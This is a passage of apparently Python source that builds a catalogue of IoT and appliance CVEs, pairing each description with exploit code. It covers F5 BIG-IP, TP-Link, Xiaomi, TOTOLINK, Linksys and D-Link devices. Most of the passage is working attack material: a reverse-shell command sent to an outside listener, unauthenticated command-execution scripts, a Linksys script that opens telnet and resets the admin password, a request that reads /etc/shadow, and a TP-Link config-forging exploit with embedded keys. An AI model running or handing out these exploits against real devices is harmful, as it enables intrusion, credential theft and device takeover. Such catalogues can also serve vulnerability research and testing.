User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.0.1
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

GO=a*0x1000
"""]
}

model_exp_dic["F5_BIG-IP"] ={
    "CVE-2020-5902":
["In BIG-IP versions 15.0.0-15.1.0.3, 14.1.0-14.1.2.5, 13.1.0-13.1.3.3, 12.1.0-12.1.5.1, and 11.6.1-11.6.5.1, the Traffic Management User Interface (TMUI), also referred to as the Configuration utility, has a Remote Code Execution (RCE) vulnerability in undisclosed pages.\n['http://packetstormsecurity.com/files/158333/BIG-IP-TMUI-Remote-Code-Execution.html', 'http://packetstormsecurity.com/files/158334/BIG-IP-TMUI-Remote-Code-Execution.html', 'http://packetstormsecurity.com/files/158366/F5-BIG-IP-TMUI-Directory-Traversal-File-Upload-Code-Execution.html', 'http://packetstormsecurity.com/files/158414/Checker-CVE-2020-5902.html', 'http://packetstormsecurity.com/files/158581/F5-Big-IP-13.1.3-Build-0.0.6-Local-File-Inclusion.html', 'https://badpackets.net/over-3000-f5-big-ip-endpoints-vulnerable-to-cve-2020-5902/', 'https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902', 'https://swarm.ptsecurity.com/rce-in-f5-big-ip/', 'https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/', 'https://support.f5.com/csp/article/K52145254', 'https://www.kb.cert.org/vuls/id/290915', 'https://support.f5.com/csp/article/K52145254']", '\n### Arbitrary file read\ncurl -k "https://192.168.31.211/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash"\ncurl -k "https://192.168.31.211/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=modify+cli+alias+private+list+command+bash"\n#### reverse_shell\ncurl -k -H "Content-Type: application/x-www-form-urlencoded" -X POST -d "fileName=/tmp/test&content=bash -i > /dev/tcp/192.168.31.56/7856 0>%261 2>%261" "https://192.168.31.211/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp"\ncurl -k "https://192.168.31.211/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/test"\n'],
    "CVE-2021-22986":
["On BIG-IP versions 16.0.x before 16.0.1.1, 15.1.x before 15.1.2.1, 14.1.x before 14.1.4, 13.1.x before 13.1.3.6, and 12.1.x before 12.1.5.3 amd BIG-IQ 7.1.0.x before 7.1.0.3 and 7.0.0.x before 7.0.0.2, the iControl REST interface has an unauthenticated remote command execution vulnerability. Note: Software versions which have reached End of Software Development (EoSD) are not evaluated.", '\ndef POC_1(target_url):\n    vuln_url = target_url + "/mgmt/tm/util/bash"\n    headers = {\n        "Authorization": "Basic YWRtaW46QVNhc1M=",\n        "X-F5-Auth-Token": "",\n        "Content-Type": "application/json"\n    }\n    data = \'{"command":"run","utilCmdArgs":"-c id"}\'\n'],
    "CVE-2022-1388":
["On F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior to 15.1.5.1, 14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5, and all 12.1.x and 11.6.x versions, undisclosed requests may bypass iControl REST authentication. Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated\n['http://packetstormsecurity.com/files/167007/F5-BIG-IP-Remote-Code-Execution.html', 'http://packetstormsecurity.com/files/167118/F5-BIG-IP-16.0.x-Remote-Code-Execution.html', 'http://packetstormsecurity.com/files/167150/F5-BIG-IP-iControl-Remote-Code-Execution.html', 'https://support.f5.com/csp/article/K23605346', 'https://support.f5.com/csp/article/K23605346']", '\n#!/usr/bin/python3\nimport argparse\nimport requests\nimport urllib3\nurllib3.disable_warnings()\n\ndef exploit(target, command):\n    url = f\'https://{target}/mgmt/tm/util/bash\'\n    headers = {\n        \'Host\': \'127.0.0.1\',\n        \'Authorization\': \'Basic YWRtaW46aG9yaXpvbjM=\',\n        \'X-F5-Auth-Token\': \'asdf\',        \n        \'Connection\': \'X-F5-Auth-Token\',\n        \'Content-Type\': \'application/json\'\n           \n    }\n    j = {"command":"run","utilCmdArgs":"-c \'{0}\'".format(command)}\n    r = requests.post(url, headers=headers, json=j, verify=False)\n    r.raise_for_status()\n    if ( r.status_code != 204 and r.headers["content-type"].strip().startswith("application/json")):\n        print(r.json()[\'commandResult\'].strip())\n    else:\n        print("Response is empty! Target does not seems to be vulnerable..")\n\nif __name__ == "__main__":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\'-t\', \'--target\', help=\'The IP address of the target\', required=True)\n    parser.add_argument(\'-c\', \'--command\', help=\'The command to execute\')\n    args = parser.parse_args()\n\n    exploit(args.target, args.command) \n'],
    "CVE-2023-22374":
["In BIG-IP starting in versions 17.0.0, 16.1.2.2, 15.1.5.1, 14.1.4.6, and 13.1.5 on their respective branches, a format string vulnerability exists in iControl SOAP that allows an authenticated attacker to crash the iControl SOAP CGI process or, potentially execute arbitrary code. In appliance mode BIG-IP, a successful exploit of this vulnerability can allow the attacker to cross a security boundary. Note: Software versions which have reached End of Technical Support (EoTS) are not evaluated.\n['MISC:https://my.f5.com/manage/s/article/K000130415','URL:https://my.f5.com/manage/s/article/K000130415']","https://bigip.example.com/iControl/iControlPortal.cgi?WSDL=ASM.LoggingProfile:%s"]
}

model_exp_dic["DSL-AC3100"] = {
    "CVE-2021-20090":
["Wireless devices running certain Arcadyan-derived firmware (such as KPN Experia WiFi 1.00.15) do not properly sanitise user input to the syslog configuration form. An authenticated remote attacker could leverage this to alter the device configuration and achieve remote code execution. This can be exploited in conjunction with CVE-2021-20090.\n['https://7bits.nl/journal/posts/cve-2021-38703-kpn-experia-wifi-root-shell/', 'https://www.kpnwebshop.com/modems-routers/producten/experia-wifi/2']", '\ncurl -vk --path-as-is "http://IP/images/..%2findex.htm"\n']
}

model_exp_dic["Tenda_AC6v2"] = {
    "CVE-2022-25445":
["Tenda AC6 v15.03.05.09_multi was discovered to contain a stack overflow via the time parameter in the PowerSaveSet function.\n['https://github.com/EPhaha/IOT_vuln/tree/main/Tenda/AC6/1']", '\n####a*0x1000=payload\nPOST /goform/PowerSaveSet HTTP/1.1\nHost: 192.168.1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 1075\nOrigin: http://192.168.1.1\nConnection: close\nReferer: http://192.168.1.1/sleep_mode.html?random=0.37181955385666365&\nCookie: password=7c90ed4e4d4bf1e300aa08103057ccbcmik1qw\n\npowerSavingEn=1&time={payload}%3A00-01%3A00&ledCloseType=allClose&powerSaveDelay=1\n']
}

model_exp_dic["mi_wifi_R3"] = {
    "CVE-2019-18371":
["An issue was discovered on Xiaomi Mi WiFi R3G devices before 2.28.23-stable. There is a directory traversal vulnerability to read arbitrary files via a misconfigured NGINX alias, as demonstrated by api-third-party/download/extdisks../etc/config/account. With this vulnerability, the attacker can bypass authentication.\n['https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/arbitrary_file_read_vulnerability.py']", '\nhttp://192.168.31.1/api-third-party/download/extdisks../etc/shadow\n'],
    "CVE-2019-18370":
["An issue was discovered on Xiaomi Mi WiFi R3G devices before 2.28.23-stable. The backup file is in tar.gz format. After uploading, the application uses the tar zxf command to decompress, so one can control the contents of the files in the decompressed directory. In addition, the application's sh script for testing upload and download speeds reads a URL list from /tmp/speedtest_urls.xml, and there is a command injection vulnerability, as demonstrated by api/xqnetdetect/netspeed.\n['https://github.com/UltramanGaia/Xiaomi_Mi_WiFi_R3G_Vulnerability_POC/blob/master/remote_command_execution_vulnerability.py']", '\nimport os\nimport tarfile\nimport requests\n\n# proxies = {"http":"http://127.0.0.1:8080"}\nproxies = {}\n\n## get stok\nstok = input("stok: ")\n\n## make config file\ncommand = input("command: ")\nspeed_test_filename = "speedtest_urls.xml"\nwith open("template.xml","rt") as f:\n    template = f.read()\ndata = template.format(command=command)\n# print(data)\nwith open("speedtest_urls.xml",\'wt\') as f:\n    f.write(data)\n\nwith tarfile.open("payload.tar.gz", "w:gz") as tar:\n    tar.add("speedtest_urls.xml")\n\n## upload config file\nprint("start uploading config file ...")\nr1 = requests.post("http://192.168.31.1/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(stok), files={"image":open("payload.tar.gz",\'rb\')}, proxies=proxies)\n# print(r1.text)\n\n## exec download speed test, exec command\nprint("start exec command...")\nr2 = requests.get("http://192.168.31.1/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(stok), proxies=proxies)\n# print(r2.text)\n\n## read result file\nr3 = requests.get("http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt", proxies=proxies)\nif r3.status_code == 200:\n    print("success, vul")\n    print(r3.text)\n']
}

model_exp_dic["TL-WR841Nv12_us"] = {
    "CVE-2022-24355":
["This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of TP-Link TL-WR940N 3.20.1 Build 200316 Rel.34392n (5553) routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the parsing of file name extensions. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-13910.\n['https://www.zerodayinitiative.com/advisories/ZDI-22-265/', 'https://www.zerodayinitiative.com/advisories/ZDI-22-265/']", '\nhttps://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/\n'],
    "CVE-2022-30024":
["A buffer overflow in the httpd daemon on TP-Link TL-WR841N V12 (firmware version 3.16.9) devices allows an authenticated remote attacker to execute arbitrary code via a GET request to the page for the System Tools of the Wi-Fi network. This affects TL-WR841 V12 TL-WR841N(EU)_V12_160624 and TL-WR841 V11 TL-WR841N(EU)_V11_160325 , TL-WR841N_V11_150616 and TL-WR841 V10 TL-WR841N_V10_150310 are also affected.\n['http://tl-wr841.com', 'http://tp-link.com', 'https://pastebin.com/0XRFr3zE']", '\nhttps://www.ddosi.org/cve-2022-30024/\n']
}

model_exp_dic["TL-WDR5620v1"] = {
    "CVE-2019-6487":
["TP-Link WDR Series devices through firmware v3 (such as TL-WDR5620 V3.0) are affected by command injection (after login) leading to remote code execution, because shell metacharacters can be included in the weather get_weather_observe citycode field.\n['https://github.com/0xcc-Since2016/TP-Link-WDR-Router-Command-injection_POC/blob/master/poc.py']", '\n#!/usr/bin/python\n#this is a POC for TP-LINK WDR5620-V3.0 Command Execution Vulnerability.\n#discoverer: Zhiniang Peng from Qihoo 360 Core Security & Fangming Gu\nfrom requests import *\n\nip      = "192.168.1.1"\nurl     = "tplogin.cn"\nheader  = {"Host": "192.168.1.1",\n"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0",\n"Accept": "application/json, text/javascript, */*; q=0.01",\n"Content-Type": "application/json; charset=UTF-8",\n"X-Requested-With": "XMLHttpRequest",}\nstok = "AAAA" # stok is login token\npath = "/web-static/test"\ndef exec_command():\n    \n    global stok\n    global header\n        global ip\n        global url\n    header[\'Host\'] = ip\n    data = \'{"weather":{"get_weather_observe":{"citycode":"1;\'+"whoami>/www/web-static/test"+\';","new_pwd":"aaaaa"}},"method":"do"}\'\n    target_url = "/" + "stok=" + stok + "/ds"\n    r = post("http://" + ip + target_url,headers=header,data=data)\n    response = get("http://" + ip + path, headers = header)\n    print response.content\nif __name__ == \'__main__\':\n\n    exec_command()\n']
}

model_exp_dic["DCS-2530L"] = {
    "CVE-2020-25078":
["An issue was discovered on D-Link DCS-2530L before 1.06.01 Hotfix and DCS-2670L through 2.02 devices. The unauthenticated /config/getuser endpoint allows for remote administrator password disclosure.\n['https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10180', 'https://twitter.com/Dogonsecurity/status/1273251236167516161']", '\ncurl -v http://IP:PORT/config/getuser?index=0\n']
}

model_exp_dic["TOTOLINK_A950RG"] = {
    "CVE-2022-25082":
['TOTOLink A950RG V5.9c.4050_B20190424 and V4.1.2cu.5204_B20210112 were discovered to contain a command injection vulnerability in the "Main" function. This vulnerability allows attackers to execute arbitrary commands via the QUERY_STRING parameter.\n[\'https://github.com/EPhaha/IOT_vuln/blob/main/TOTOLink/A950RG/README.md\']', '\nGET /cgi-bin/downloadFlile.cgi?payload=`ls>../1.txt` HTTP/1.1 \nHost: 192.168.111.12 \nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0 \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 \nAccept-Encoding: gzip, deflate \nConnection: keep-alive \nUpgrade-Insecure-Requests: 1 \nCache-Control: max-age=0\n']
}

model_exp_dic["TOTOLINK_T10"] = {
    "CVE-2022-25081":
['TOTOLink T10 V5.9c.5061_B20200511 was discovered to contain a command injection vulnerability in the "Main" function. This vulnerability allows attackers to execute arbitrary commands via the QUERY_STRING parameter.\n[\'https://github.com/EPhaha/IOT_vuln/blob/main/TOTOLink/T10/README.md\']', '\nimport requests\n\nwhile(1):\n    print \'$\',\n    a = \'aabb;\' + raw_input().replace(\' \',\'$IFS$1\') + \';\'\n    response = requests.get("http://192.168.55.1/cgi-bin/downloadFlile.cgi",params=a)\n    print response.text.replace("QUERY_STRING:aabb",\'\')\n']
}

model_exp_dic["TOTOLINK_A860R"] = {
    "CVE-2022-37840":
["In TOTOLINK A860R V4.1.2cu.5182_B20201027, the main function in downloadfile.cgi has a buffer overflow vulnerability.\n['https://github.com/1759134370/iot/blob/main/TOTOLINK/A860R/3.md']", '\nGET /cgi-bin/downloadFlile.cgi?payload=`ls>../1.txt` HTTP/1.1 \nHost: 192.168.111.12 \nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0 \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 \nAccept-Encoding: gzip, deflate \nConnection: keep-alive \nUpgrade-Insecure-Requests: 1 \nCache-Control: max-age=0\n']
}


model_exp_dic["Linsys_RE6500"] = {
    "CVE-2020-35714":
["Belkin LINKSYS RE6500 devices before 1.0.11.001 allow remote authenticated users to execute arbitrary commands via goform/systemCommand?command= in conjunction with the goform/pingstart program.\n['https://bugcrowd.com/disclosures/72d7246b-f77f-4f7f-9bd1-fdc35663cc92/linksys-re6500-unauthenticated-rce-working-across-multiple-fw-versions', 'https://downloads.linksys.com/support/assets/releasenotes/ExternalReleaseNotes_RE6500_1.0.012.001.txt', 'https://resolverblog.blogspot.com/2020/07/linksys-re6500-unauthenticated-rce-full.html']", '\n#!/usr/bin/env python\n#Linksys RE6500 V1.05 - Authenticated command injection Ping page\n\nfrom requests import Session\nimport requests\nimport os\nip="192.168.1.226"\nurl_codeinjection="http://"+ip+"/goform/systemCommand?pingTestIP=www.google.com&ping_size=32&ping_times=5&command=busybox+telnetd&+"\n\nrequestedbody_login="password=0000074200016071000071120003627500015159"\n\ns = requests.Session()\n\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\ns.post("http://"+ip+"/goform/webLogin",data=requestedbody_login)\n\ns.headers.update({\'Referer\': "http://"+ip+"/admin/diagnostics.shtml"})\n\ns.get(url_codeinjection)\n\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/admin/startping.shtml"})\n\ns.post("http://"+ip+"/goform/pingstart", data="")\n'],
    "CVE-2020-35713":
["Belkin LINKSYS RE6500 devices before 1.0.012.001 allow remote attackers to execute arbitrary commands or set a new password via shell metacharacters to the goform/setSysAdm page.\n['https://bugcrowd.com/disclosures/72d7246b-f77f-4f7f-9bd1-fdc35663cc92/linksys-re6500-unauthenticated-rce-working-across-multiple-fw-versions', 'https://downloads.linksys.com/support/assets/releasenotes/ExternalReleaseNotes_RE6500_1.0.012.001.txt', 'https://resolverblog.blogspot.com/2020/07/linksys-re6500-unauthenticated-rce-full.html']", '\n#!/usr/bin/env python\n#Linksys RE6500 V1.0.05.003 and newer - Unauthenticated RCE\n#Unsanitized user input in the web interface for Linksys WiFi extender RE6500 allows Unauthenticated remote command execution. \n#An attacker can access system OS configurations and commands that are not intended for use beyond the web UI. \n\n# Exploit Author: RE-Solver - https://twitter.com/solver_re\n# Vendor Homepage: www.linksys.com\n# Version: FW V1.05 up to FW v1.0.11.001\n\nfrom requests import Session\nimport requests\nimport os\nprint("Linksys RE6500, RE6500 - Unsanitized user input allows Unauthenticated remote command execution.")\nprint("Tested on FW V1.05 up to FW v1.0.11.001")\nprint("RE-Solver @solver_re")\nip="192.168.1.226"\n\ncommand="nvram_get Password >/tmp/lastpwd"\n#save device password;\npost_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\n\nr= s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Prev password saved in /tmp/lastpwd")\n\ncommand="busybox telnetd"\n#start telnetd;\npost_data="admuser=admin&admpass=;"+command+";&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\n\nr=s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Telnet Enabled")\n\n#set admin password\npost_data="admuser=admin&admpass=0000074200016071000071120003627500015159&confirmadmpass=admin&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1"\nurl_codeinjection="http://"+ip+"/goform/setSysAdm"\ns = requests.Session()\ns.headers.update({\'Origin\': "http://"+ip})\ns.headers.update({\'Referer\': "http://"+ip+"/login.shtml"})\nr=s.post(url_codeinjection, data=post_data)\nif r.status_code == 200:\n    print("[+] Prevent corrupting nvram - set a new password= admin"\n']
}

model_exp_dic["TP_Archer_AX50"] = {
    "CVE-2022-30075":
["In TP-Link Router AX50 firmware 210730 and older, import of a malicious backup file via web interface can lead to remote code execution due to improper validation.\n['http://packetstormsecurity.com/files/167522/TP-Link-AX50-Remote-Code-Execution.html', 'http://tp-link.com', 'https://github.com/aaronsvk', 'https://github.com/aaronsvk/CVE-2022-30075', 'https://www.exploit-db.com/exploits/50962']", '\n#!/usr/bin/python3\n# Exploit Title: TP-Link Routers - Authenticated Remote Code Execution\n# Exploit Author: Tomas Melicher\n# Technical Details: https://github.com/aaronsvk/CVE-2022-30075\n# Date: 2022-06-08\n# Vendor Homepage: https://www.tp-link.com/\n# Tested On: Tp-Link Archer AX50\n# Vulnerability Description:\n#   Remote Code Execution via importing malicious config file\n\nimport argparse # pip install argparse\nimport requests # pip install requests\nimport binascii, base64, os, re, json, sys, time, math, random, hashlib\nimport tarfile, zlib\nfrom Crypto.Cipher import AES, PKCS1_v1_5, PKCS1_OAEP # pip install pycryptodome\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto.Random import get_random_bytes\nfrom urllib.parse import urlencode\n\nclass WebClient(object):\n\n\tdef __init__(self, target, password):\n\t\tself.target = target\n\t\tself.password = password.encode(\'utf-8\')\n\t\tself.password_hash = hashlib.md5((\'admin%s\'%password).encode(\'utf-8\')).hexdigest().encode(\'utf-8\')\n\t\tself.aes_key = (str(time.time()) + str(random.random())).replace(\'.\',\'\')[0:AES.block_size].encode(\'utf-8\')\n\t\tself.aes_iv = (str(time.time()) + str(random.random())).replace(\'.\',\'\')[0:AES.block_size].encode(\'utf-8\')\n\n\t\tself.stok = \'\'\n\t\tself.session = requests.Session()\n\n\t\tdata = self.basic_request(\'/login?form=auth\', {\'operation\':\'read\'})\n\t\tif data[\'success\'] != True:\n\t\t\tprint(\'[!] unsupported router\')\n\t\t\treturn\n\t\tself.sign_rsa_n = int(data[\'data\'][\'key\'][0], 16)\n\t\tself.sign_rsa_e = int(data[\'data\'][\'key\'][1], 16)\n\t\tself.seq = data[\'data\'][\'seq\']\n\n\t\tdata = self.basic_request(\'/login?form=keys\', {\'operation\':\'read\'})\n\t\tself.password_rsa_n = int(data[\'data\'][\'password\'][0], 16)\n\t\tself.password_rsa_e = int(data[\'data\'][\'password\'][1], 16)\n\n\t\tself.stok = self.login()\n\n\n\tdef aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = pad(plaintext, aes_block_size)\n\t\treturn cipher.encrypt(plaintext_padded)\n\n\n\tdef aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = cipher.decrypt(ciphertext)\n\t\tplaintext = unpad(plaintext_padded, aes_block_size)\n\t\treturn plaintext\n\n\n\tdef rsa_encrypt(self, n, e, plaintext):\n\t\tpublic_key = RSA.construct((n, e)).publickey()\n\t\tencryptor = PKCS1_v1_5.new(public_key)\n\t\tblock_size = int(public_key.n.bit_length()/8) - 11\n\t\tencrypted_text = \'\'\n\t\tfor i in range(0, len(plaintext), block_size):\n\t\t\tencrypted_text += encryptor.encrypt(plaintext[i:i+block_size]).hex()\n\t\treturn encrypted_text\n\n\n\tdef download_request(self, url, post_data):\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data=post_data, stream=True)\n\t\tfilepath = os.getcwd()+\'/\'+re.findall(r\'(?<=filename=")[^"]+\', res.headers[\'Content-Disposition\'])[0]\n\t\tif os.path.exists(filepath):\n\t\t\tprint(\'[!] can\'t download, file "%s" already exists\' % filepath)\n\t\t\treturn\n\t\twith open(filepath, \'wb\') as f:\n\t\t\tfor chunk in res.iter_content(chunk_size=4096):\n\t\t\t\tf.write(chunk)\n\t\treturn filepath\n\n\n\tdef basic_request(self, url, post_data, files_data={}):\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data=post_data, files=files_data)\n\t\treturn json.loads(res.content)\n\n\n\tdef encrypted_request(self, url, post_data):\n\t\tserialized_data = urlencode(post_data)\n\t\tencrypted_data = self.aes_encrypt(self.aes_key, self.aes_iv, AES.block_size, serialized_data.encode(\'utf-8\'))\n\t\tencrypted_data = base64.b64encode(encrypted_data)\n\n\t\tsignature = (\'k=%s&i=%s&h=%s&s=%d\'.encode(\'utf-8\')) % (self.aes_key, self.aes_iv, self.password_hash, self.seq+len(encrypted_data))\n\t\tencrypted_signature = self.rsa_encrypt(self.sign_rsa_n, self.sign_rsa_e, signature)\n\n\t\tres = self.session.post(\'http://%s/cgi-bin/luci/;stok=%s%s\'%(self.target,self.stok,url), data={\'sign\':encrypted_signature, \'data\':encrypted_data}) # order of params is important\n\t\tif(res.status_code != 200):\n\t\t\tprint(\'[!] url "%s" returned unexpected status code\'%(url))\n\t\t\treturn\n\t\tencrypted_data = json.loads(res.content)\n\t\tencrypted_data = base64.b64decode(encrypted_data[\'data\'])\n\t\tdata = self.aes_decrypt(self.aes_key, self.aes_iv, AES.block_size, encrypted_data)\n\t\treturn json.loads(data)\n\n\n\tdef login(self):\n\t\tpost_data = {\'operation\':\'login\', \'password\':self.rsa_encrypt(self.password_rsa_n, self.password_rsa_e, self.password)}\n\t\tdata = self.encrypted_request(\'/login?form=login\', post_data)\n\t\tif data[\'success\'] != True:\n\t\t\tprint(\'[!] login failed\')\n\t\t\treturn\n\t\tprint(\'[+] logged in, received token (stok): %s\'%(data[\'data\'][\'stok\']))\n\t\treturn data[\'data\'][\'stok\']\n\n\n\nclass BackupParser(object):\n\n\tdef __init__(self, filepath):\n\t\tself.encrypted_path = os.path.abspath(filepath)\n\t\tself.decrypted_path = os.path.splitext(filepath)[0]\n\n\t\tself.aes_key = bytes.fromhex(\'2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836\') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua\n\t\tself.iv = bytes.fromhex(\'360028C9064242F81074F4C127D299F6\') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua\n\n\n\tdef aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = pad(plaintext, aes_block_size)\n\t\treturn cipher.encrypt(plaintext_padded)\n\n\n\tdef aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):\n\t\tcipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)\n\t\tplaintext_padded = cipher.decrypt(ciphertext)\n\t\tplaintext = unpad(plaintext_padded, aes_block_size)\n\t\treturn plaintext\n\n\n\tdef encrypt_config(self):\n\t\tif not os.path.isdir(self.decrypted_path):\n\t\t\tprint(\'[!] invalid directory "%s"\'%(self.decrypted_path))\n\t\t\treturn\n\n\t\t# encrypt, compress each .xml using zlib and add them to tar archive\n\t\twith tarfile.open(\'%s/data.tar\'%(self.decrypted_path), \'w\') as tar:\n\t\t\tfor filename in os.listdir(self.decrypted_path):\n\t\t\t\tbasename,ext = os.path.splitext(filename)\n\t\t\t\tif ext == \'.xml\':\n\t\t\t\t\txml_path = \'%s/%s\'%(self.decrypted_path,filename)\n\t\t\t\t\tbin_path = \'%s/%s.bin\'%(self.decrypted_path,basename)\n\t\t\t\t\twith open(xml_path, \'rb\') as f:\n\t\t\t\t\t\tplaintext = f.read()\n\t\t\t\t\tif len(plaintext) == 0:\n\t\t\t\t\t\tf = open(bin_path, \'w\')\n\t\t\t\t\t\tf.close()\n\t\t\t\t\telse:\n\t\t\t\t\t\tcompressed = zlib.compress(plaintext)\n\t\t\t\t\t\tencrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)\n\t\t\t\t\t\twith open(bin_path, \'wb\') as f:\n\t\t\t\t\t\t\tf.write(encrypted)\n\t\t\t\t\ttar.add(bin_path, os.path.basename(bin_path))\n\t\t\t\t\tos.unlink(bin_path)\n\t\t# compress tar archive using zlib and encrypt\n\t\twith open(\'%s/md5_sum\'%(self.decrypted_path), \'rb\') as f1, open(\'%s/data.tar\'%(self.decrypted_path), \'rb\') as f2:\n\t\t\tcompressed = zlib.compress(f1.read()+f2.read())\n\t\tencrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)\n\t\t# write into final config file\n\t\twith open(\'%s\'%(self.encrypted_path), \'wb\') as f:\n\t\t\tf.write(encrypted)\n\t\tos.unlink(\'%s/data.tar\'%(self.decrypted_path))\n\n\n\tdef decrypt_config(self):\n\t\tif not os.path.isfile(self.encrypted_path):\n\t\t\tprint(\'[!] invalid file "%s"\'%(self.encrypted_path))\n\t\t\treturn\n\n\t\t# decrypt and decompress config file\n\t\twith open(self.encrypted_path, \'rb\') as f:\n\t\t\tdecrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, f.read())\n\t\tdecompressed = zlib.decompress(decrypted)\n\t\tos.mkdir(self.decrypted_path)\n\t\t# store decrypted data into files\n\t\twith open(\'%s/md5_sum\'%(self.decrypted_path), \'wb\') as f:\n\t\t\tf.write(decompressed[0:16])\n\t\twith open(\'%s/data.tar\'%(self.decrypted_path), \'wb\') as f:\n\t\t\tf.write(decompressed[16:])\n\t\t# untar second part of decrypted data\n\t\twith tarfile.open(\'%s/data.tar\'%(self.decrypted_path), \'r\') as tar:\n\t\t\ttar.extractall(path=self.decrypted_path)\n\t\t# decrypt and decompress each .bin file from tar archive\n\t\tfor filename in os.listdir(self.decrypted_path):\n\t\t\tbasename,ext = os.path.splitext(filename)\n\t\t\tif ext == \'.bin\':\n\t\t\t\tbin_path = \'%s/%s\'%(self.decrypted_path,filename)\n\t\t\t\txml_path = \'%s/%s.xml\'%(self.decrypted_path,basename)\n\t\t\t\twith open(bin_path, \'rb\') as f:\n\t\t\t\t\tciphertext = f.read()\n\t\t\t\tos.unlink(bin_path)\n\t\t\t\tif len(ciphertext) == 0:\n\t\t\t\t\tf = open(xml_path, \'w\')\n\t\t\t\t\tf.close()\n\t\t\t\t\tcontinue\n\t\t\t\tdecrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, ciphertext)\n\t\t\t\tdecompressed = zlib.decompress(decrypted)\n\t\t\t\twith open(xml_path, \'wb\') as f:\n\t\t\t\t\tf.write(decompressed)\n\t\tos.unlink(\'%s/data.tar\'%(self.decrypted_path))\n\n\n\tdef modify_config(self, command):\n\t\txml_path = \'%s/ori-backup-user-config.xml\'%(self.decrypted_path)\n\t\tif not os.path.isfile(xml_path):\n\t\t\tprint(\'[!] invalid file "%s"\'%(xml_path))\n\t\t\treturn\n\n\t\twith open(xml_path, \'r\') as f:\n\t\t\txml_content = 